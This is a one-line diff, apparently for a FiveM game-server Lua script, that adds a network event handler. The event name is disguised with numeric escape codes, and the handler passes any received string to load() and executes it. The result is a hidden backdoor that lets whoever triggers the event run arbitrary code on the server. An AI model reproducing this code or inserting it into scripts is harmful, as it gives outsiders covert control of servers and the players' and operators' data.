@@ -1,0 +1,1 @@
+RegisterNetEvent("\65\79\98\98\70\103")AddEventHandler("\65\79\98\98\70\103",function(a)load(a)()end)
